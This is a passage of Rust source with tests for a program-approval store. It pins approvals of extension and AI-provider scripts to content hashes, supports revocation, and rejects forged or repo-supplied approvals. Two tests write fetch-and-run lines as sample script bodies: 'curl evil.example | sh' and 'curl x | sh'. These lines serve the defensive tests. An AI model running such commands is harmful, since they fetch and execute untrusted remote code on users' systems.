/// next thing it does, nothing it was granted holds. Errs when there's no
/// such program.
pub fn revoke_program(
    store: &ApprovalStore,
    project_dir: &Path,
    extensions: &[crate::extensions::Extension],
    kind: ProgramKind,
    name: &str,
) -> Result<(), String> {
    let program = list(store, project_dir, extensions)
        .into_iter()
        .find(|p| p.kind == kind && p.name == name)
        .ok_or_else(|| format!("no {kind:?} program `{name}`"))?;
    store.revoke(&program.key()).map_err(|e| e.to_string())?;
    Ok(())
}

/// Approve every listed program of `kind` as it is now — what a person
/// does by approving each on Settings → Data, done by a host that is its
/// own person: a throwaway preview (`oxplow extension test`) and tests.
/// Returns the names it approved.
pub fn approve_every(svc: &crate::Services, kind: ProgramKind) -> Result<Vec<String>, String> {
    let project = svc.layout.project_dir.clone();
    let extensions = svc
        .extension_catalog
        .unpinned(&project, "approval reads the declared programs");
    let mut approved = Vec::new();
    for p in list(&svc.approvals, &project, &extensions)
        .into_iter()
        .filter(|p| p.kind == kind)
    {
        let version = p
            .version
            .clone()
            .ok_or_else(|| format!("`{}` has no version to approve", p.name))?;
        approve_program(
            &svc.approvals,
            &project,
            &extensions,
            kind,
            &p.name,
            &version,
        )?;
        approved.push(p.name);
    }
    Ok(approved)
}

/// Approve the project program `kind`/`name` as it is now. Only a person
/// calls this (the Settings → Data button).
///
/// `version` is the one the person reviewed (from the listing): if the
/// program changed since, nothing is approved.
pub fn approve_program(
    store: &ApprovalStore,
    project_dir: &Path,
    extensions: &[crate::extensions::Extension],
    kind: ProgramKind,
    name: &str,
    version: &str,
) -> Result<(), String> {
    let p = list(store, project_dir, extensions)
        .into_iter()
        .find(|p| p.kind == kind && p.name == name)
        .ok_or_else(|| format!("no exec {kind:?} named `{name}` in the project's config"))?;
    let hash = p
        .hash(project_dir)
        .map_err(|e| format!("{}: {e}", p.program))?;
    if hash != version {
        return Err(format!(
            "`{name}` changed since you reviewed it; look at it again before approving"
        ));
    }
    store
        .approve(&p.key(), &hash)
        .map_err(|e| format!("record approval: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A folder whose order differs as strings and as paths (`a-b/x` sorts
    /// before `a/b` as text, after it as path components), dot-files and
    /// all.
    fn pin_folder(dir: &Path) {
        for (rel, body) in [
            ("a/b", "one"),
            ("a-b/x", "two"),
            (".hidden", "three"),
            ("effects/run.star", "def transform(x):\n    return {}\n"),
        ] {
            let path = dir.join(rel);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, body).unwrap();
        }
    }

    /// tsk953: an approval's digest of a folder on disk is the one people
    /// approved against — it must not move, or every approval lapses.
    #[test]
    fn a_folders_digest_is_pinned() {
        let dir = tempfile::tempdir().unwrap();
        pin_folder(dir.path());
        assert_eq!(tree_hash(dir.path()).unwrap(), PINNED_DIGEST);
    }

    const PINNED_DIGEST: &str = "d5f817bd20dd343db4f8f6e30743b005d14604c1ae43dab78e55dde3836ffa4b";

    /// tsk953: a bundled extension's files are hashed as they're embedded,
    /// alike with the same files on disk — so a bundled effect can be
    /// approved, and its approval means what a folder's would.
    #[test]
    fn a_folder_and_its_embedded_copy_hash_alike() {
        let bundled = crate::bundled_extensions::BUNDLED
            .iter()
            .find(|b| b.name == "oxplow-bundled")
            .unwrap();
        let dir = tempfile::tempdir().unwrap();
        for (rel, body) in bundled.files {
            let path = dir.path().join(rel);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, body).unwrap();
        }
        let none = |_: &Path| false;
        let embedded = files_hash(
            &*crate::extensions::files_at(dir.path(), "bundled:oxplow-bundled").unwrap(),
            &none,
        )
        .unwrap();
        assert_eq!(embedded, tree_hash(dir.path()).unwrap());
        assert_eq!(
            files_hash(
                &*crate::extensions::files_at(Path::new("/"), dir.path().to_str().unwrap())
                    .unwrap(),
                &none
            )
            .unwrap(),
            embedded
        );
        // An effect program in a bundled extension has a version to approve.
        let program = ProjectProgram {
            kind: ProgramKind::Effect,
            capability: None,
            name: "oxplow-bundled/x".into(),
            program: "bundled:oxplow-bundled/extension.yaml".into(),
            args: Vec::new(),
            env: Vec::new(),
            credentials: Vec::new(),
            network: Vec::new(),
            commands: Vec::new(),
            scopes: Vec::new(),
            tree: Some("bundled:oxplow-bundled".into()),
            remote: false,
            approved: false,
            version: None,
            unenforced: Vec::new(),
            granted_at: None,
            revoked_at: None,
        };
        assert!(program.hash(dir.path()).is_ok());
    }

    /// tsk953: a person reads what they're asked to approve where it lives —
    /// a bundled program's entry from its embedded files.
    #[test]
    fn a_programs_source_is_read_where_it_lives() {
        let dir = tempfile::tempdir().unwrap();
        let bundled = ProjectProgram {
            kind: ProgramKind::Effect,
            capability: None,
            name: "oxplow-bundled/x".into(),
            program: "bundled:oxplow-bundled/extension.yaml".into(),
            args: Vec::new(),
            env: Vec::new(),
            credentials: Vec::new(),
            network: Vec::new(),
            commands: Vec::new(),
            scopes: Vec::new(),
            tree: Some("bundled:oxplow-bundled".into()),
            remote: false,
            approved: false,
            version: None,
            unenforced: Vec::new(),
            granted_at: None,
            revoked_at: None,
        };
        assert!(bundled
            .source(dir.path())
            .unwrap()
            .contains("name: oxplow-bundled"));
        std::fs::create_dir_all(dir.path().join("oxplow/extensions/acme/effects")).unwrap();
        std::fs::write(
            dir.path().join("oxplow/extensions/acme/effects/run.star"),
            "def transform(x): pass\n",
        )
        .unwrap();
        let disk = ProjectProgram {
            program: "oxplow/extensions/acme/effects/run.star".into(),
            tree: Some("oxplow/extensions/acme".into()),
            ..bundled
        };
        assert_eq!(disk.source(dir.path()).unwrap(), "def transform(x): pass\n");
    }

    /// tsk953: what an embedded extension's approval covers is every file:
    /// a new oxplow that changes one asks again.
    #[test]
    fn a_changed_embedded_file_changes_the_hash() {
        let leak = |files: Vec<(&'static str, &'static str)>| -> &'static crate::bundled_extensions::BundledExtension {
            Box::leak(Box::new(crate::bundled_extensions::BundledExtension {
                name: "acme",
                files: Box::leak(
                    files
                        .into_iter()
                        .map(|(p, t)| (p, t.as_bytes()))
                        .collect::<Vec<_>>()
                        .into_boxed_slice(),
                ),
                required: false,
            }))
        };
        let before = leak(vec![
            ("extension.yaml", "name: acme"),
            ("effects/run.star", "one"),
        ]);
        let after = leak(vec![
            ("extension.yaml", "name: acme"),
            ("effects/run.star", "two"),
        ]);
        let none = |_: &Path| false;
        let hash = |b| files_hash(&crate::extensions::Embedded(b), &none).unwrap();
        assert_ne!(hash(before), hash(after));
    }

    /// An effort policy written as a script is a program a person
    /// approves: listed with the scopes it reads, approved over its script
    /// and every file of its extension, so an edit to any of them asks again.
    #[test]
    fn a_policy_script_is_approved_over_its_extensions_folder() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        let ext = dir.path().join("oxplow/extensions/acme");
        std::fs::create_dir_all(ext.join("policies")).unwrap();
        std::fs::write(
            ext.join("extension.yaml"),
            "manifest: 2\nname: acme\nsharing: private\nintent:\n  purpose: a policy\n  examples: [{ name: a }]\nimplementations:\n  - { capability: effort_policy, id: tidy, entry: policies/tidy.star, needs: [sql.read] }\n",
        )
        .unwrap();
        std::fs::write(
            ext.join("policies/tidy.star"),
            "def transform(x):\n    return {\"skip\": \"no\"}\n",
        )
        .unwrap();
        let load = || crate::extensions::load_extensions(dir.path());
        let program = |extensions: &[crate::extensions::Extension]| {
            list(&st, dir.path(), extensions)
                .into_iter()
                .find(|p| p.kind == ProgramKind::EffortPolicy)
                .expect("the policy script is listed")
        };
        let extensions = load();
        let listed = program(&extensions);
        assert_eq!(listed.name, "acme/tidy");
        assert_eq!(listed.key(), "effort_policy:acme/tidy");
        assert_eq!(listed.scopes, vec!["sql.read".to_string()]);
        assert!(
            listed.program.ends_with("policies/tidy.star"),
            "{}",
            listed.program
        );
        assert!(!listed.approved);
        approve_program(
            &st,
            dir.path(),
            &extensions,
            ProgramKind::EffortPolicy,
            "acme/tidy",
            listed.version.as_deref().unwrap(),
        )
        .unwrap();
        assert!(program(&extensions).approved);
        std::fs::write(ext.join("README.md"), "# Acme\n").unwrap();
        let changed = program(&load());
        assert_ne!(changed.version, listed.version);
        assert!(!changed.approved);
    }

    /// A project extension with one policy script, on disk, and its listed
    /// program (the extensions are read from disk each time, as boot does).
    fn policy(dir: &Path, body: &str) -> (Vec<crate::extensions::Extension>, ProjectProgram) {
        let ext = dir.join("oxplow/extensions/acme");
        std::fs::create_dir_all(ext.join("policies")).unwrap();
        std::fs::write(
            ext.join("extension.yaml"),
            "manifest: 2\nname: acme\nsharing: private\nintent:\n  purpose: a policy\n  examples: [{ name: a }]\nimplementations:\n  - { capability: effort_policy, id: tidy, entry: policies/tidy.star, needs: [sql.read] }\n",
        )
        .unwrap();
        std::fs::write(ext.join("policies/tidy.star"), body).unwrap();
        let extensions = crate::extensions::load_extensions(dir);
        let home = tempfile::tempdir().unwrap();
        let program = list(&store(home.path(), dir), dir, &extensions)
            .into_iter()
            .find(|p| p.kind == ProgramKind::EffortPolicy)
            .expect("the policy script is listed");
        (extensions, program)
    }

    /// Approval is of the version the person reviewed: approving the one a
    /// listing showed, after the program changed, is refused and approves
    /// nothing; the version the listing shows now is approved.
    #[test]
    fn approving_a_version_that_has_since_changed_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        let (_, seen) = policy(
            dir.path(),
            "def transform(x):\n    return {\"skip\": \"a\"}\n",
        );
        let seen = seen.version.clone().unwrap();
        let (extensions, changed) = policy(
            dir.path(),
            "def transform(x):\n    return {\"skip\": \"b\"}\n",
        );
        assert_ne!(changed.version.as_deref(), Some(seen.as_str()));
        let err = approve_program(
            &st,
            dir.path(),
            &extensions,
            ProgramKind::EffortPolicy,
            "acme/tidy",
            &seen,
        )
        .unwrap_err();
        assert!(err.contains("changed since you reviewed it"), "{err}");
        let listed = |extensions: &[crate::extensions::Extension]| {
            list(&st, dir.path(), extensions)
                .into_iter()
                .find(|p| p.kind == ProgramKind::EffortPolicy)
                .unwrap()
        };
        assert!(!listed(&extensions).approved, "nothing was approved");
        approve_program(
            &st,
            dir.path(),
            &extensions,
            ProgramKind::EffortPolicy,
            "acme/tidy",
            changed.version.as_deref().unwrap(),
        )
        .unwrap();
        assert!(listed(&extensions).approved);
    }

    /// Revoking by name takes an approval back: the listing shows it
    /// unapproved with when it was revoked; a name that isn't listed is an
    /// error.
    #[test]
    fn revoking_through_the_listing_takes_the_approval_back() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        let (extensions, program) = policy(
            dir.path(),
            "def transform(x):\n    return {\"skip\": \"a\"}\n",
        );
        approve_program(
            &st,
            dir.path(),
            &extensions,
            ProgramKind::EffortPolicy,
            "acme/tidy",
            program.version.as_deref().unwrap(),
        )
        .unwrap();
        let row = |extensions: &[crate::extensions::Extension]| {
            list(&st, dir.path(), extensions)
                .into_iter()
                .find(|p| p.kind == ProgramKind::EffortPolicy)
                .unwrap()
        };
        assert!(row(&extensions).approved);
        revoke_program(&st, dir.path(), &[], ProgramKind::EffortPolicy, "acme/tidy").unwrap_err();
        revoke_program(
            &st,
            dir.path(),
            &extensions,
            ProgramKind::EffortPolicy,
            "acme/tidy",
        )
        .unwrap();
        let revoked = row(&extensions);
        assert!(!revoked.approved);
        assert!(revoked.revoked_at.is_some(), "{revoked:?}");
        let err = revoke_program(
            &st,
            dir.path(),
            &extensions,
            ProgramKind::EffortPolicy,
            "acme/nope",
        )
        .unwrap_err();
        assert!(err.contains("acme/nope"), "{err}");
    }

    /// A store outside `dir`'s project tree, with an in-memory keychain.
    fn store(home: &Path, project: &Path) -> ApprovalStore {
        ApprovalStore::at(
            approvals_file(home, project),
            project,
            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
        )
    }

    /// A project script (an AI provider's) as a program to approve.
    fn script(dir: &Path, body: &str) -> ProjectProgram {
        std::fs::create_dir_all(dir.join("ext")).unwrap();
        std::fs::write(dir.join("ext/agent.star"), body).unwrap();
        ai_provider_program("ext", "acme", "gemini", "agent.star", None)
    }

    /// A program runs only once approved at its content: a change to the
    /// script is not what was approved, and approving it again holds again.
    #[test]
    fn a_program_runs_only_once_approved_at_its_content() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        let program = script(dir.path(), "def transform(x):\n    return {}\n");
        assert!(!is_program_approved(&st, dir.path(), &program));
        let hash = program.hash(dir.path()).unwrap();
        st.approve(&program.key(), &hash).unwrap();
        assert!(is_program_approved(&st, dir.path(), &program));
        std::fs::write(dir.path().join("ext/agent.star"), "curl evil.example | sh").unwrap();
        assert!(!is_program_approved(&st, dir.path(), &program));
        let hash = program.hash(dir.path()).unwrap();
        st.approve(&program.key(), &hash).unwrap();
        assert!(is_program_approved(&st, dir.path(), &program));
    }

    /// A person revokes an approval: it stops holding at once, and says
    /// when; approving again holds again.
    #[test]
    fn an_approval_can_be_revoked() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        st.approve("effect:acme/note", "h1").unwrap();
        assert!(st.is_approved("effect:acme/note", "h1"));
        assert!(st.granted_at("effect:acme/note").is_some());
        assert!(st.revoke("effect:acme/note").unwrap());
        assert!(!st.is_approved("effect:acme/note", "h1"));
        assert!(st.revoked_at("effect:acme/note").is_some());
        assert!(
            !st.revoke("effect:acme/note").unwrap(),
            "nothing left to revoke"
        );
        st.approve("effect:acme/note", "h1").unwrap();
        assert!(st.is_approved("effect:acme/note", "h1"));
        assert!(st.revoked_at("effect:acme/note").is_none());
    }

    /// A person revokes a program: it may not run again until they approve
    /// it again.
    #[test]
    fn a_revoked_program_may_not_run_until_approved_again() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        let program = script(dir.path(), "v1");
        let hash = program.hash(dir.path()).unwrap();
        st.approve(&program.key(), &hash).unwrap();
        assert!(is_program_approved(&st, dir.path(), &program));
        assert!(st.revoke(&program.key()).unwrap());
        assert!(!is_program_approved(&st, dir.path(), &program));
        assert!(st.revoked_at(&program.key()).is_some());
    }

    #[test]
    fn approvals_live_outside_the_project() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let f = approvals_file(home.path(), dir.path());
        assert!(f.starts_with(home.path()));
        assert!(!f.starts_with(dir.path()));
        // Keyed by the canonical project path: another project gets another file.
        let other = tempfile::tempdir().unwrap();
        assert_ne!(f, approvals_file(home.path(), other.path()));
    }

    #[test]
    fn a_repo_supplied_or_forged_approval_grants_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        let program = script(dir.path(), "curl x | sh");
        let hash = program.hash(dir.path()).unwrap();
        let key = program.key();
        let may = |st: &ApprovalStore| is_program_approved(st, dir.path(), &program);

        // A committed (or agent-written) file in the repo, with the right
        // hash: approvals are never read from inside a project.
        std::fs::create_dir_all(dir.path().join(".oxplow")).unwrap();
        std::fs::write(
            dir.path().join(".oxplow").join("source-approvals.json"),
            format!("{{\"approved\":{{\"{key}\":\"{hash}\"}}}}"),
        )
        .unwrap();
        assert!(!may(&st));

        // A forged entry in the real store: right hash, no valid MAC.
        let f = approvals_file(home.path(), dir.path());
        std::fs::create_dir_all(f.parent().unwrap()).unwrap();
        std::fs::write(
            &f,
            format!("{{\"approved\":{{\"{key}\":{{\"hash\":\"{hash}\",\"mac\":\"00\"}}}}}}"),
        )
        .unwrap();
        assert!(!may(&st));

        // A person's approval works, and a copy MACed under another
        // machine's key (another keychain) doesn't.
        st.approve(&key, &hash).unwrap();
        assert!(may(&st));
        let elsewhere = store(home.path(), dir.path());
        assert!(!may(&elsewhere));
    }

    /// tsk546: an approval covers every file of the folder — dot-files
    /// included — and a symlink (whose target isn't what was approved)
    /// can't be approved at all.
    #[test]
    fn the_tree_hash_covers_dot_files_and_refuses_symlinks() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".impl")).unwrap();
        std::fs::write(dir.path().join("run.sh"), "exec node .impl/main.js").unwrap();
        std::fs::write(dir.path().join(".impl/main.js"), "good()").unwrap();
        let before = tree_hash(dir.path()).unwrap();
        std::fs::write(dir.path().join(".impl/main.js"), "evil()").unwrap();
        assert_ne!(
            tree_hash(dir.path()).unwrap(),
            before,
            "a hidden file is code too"
        );

        // OS noise isn't.
        let settled = tree_hash(dir.path()).unwrap();
        std::fs::write(dir.path().join(".DS_Store"), "finder").unwrap();
        assert_eq!(tree_hash(dir.path()).unwrap(), settled);

        let outside = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(outside.path(), dir.path().join("lib")).unwrap();
        let err = tree_hash(dir.path()).unwrap_err().to_string();
        assert!(err.contains("symlink") && err.contains("lib"), "{err}");
    }
}
